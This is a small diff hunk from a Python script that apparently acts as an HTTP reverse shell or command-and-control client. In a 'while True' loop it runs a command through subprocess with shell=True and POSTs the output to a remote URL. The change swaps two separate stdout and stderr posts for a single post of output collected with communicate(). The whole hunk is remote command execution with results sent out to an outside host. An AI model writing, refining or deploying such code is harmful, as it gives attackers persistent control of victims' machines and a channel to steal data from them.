@@ -14,8 +14,8 @@ while True:
 
     else:
         try:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            post_response = requests.post(url=_url, data=CMD.stdout.read())
-            post_response = requests.post(url=_url, data=CMD.stderr.read())
+            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+            out, err = p.communicate()
+            post_response = requests.post(url=_url, data=out)
         except Exception as e:
             print(f"=( {e}")
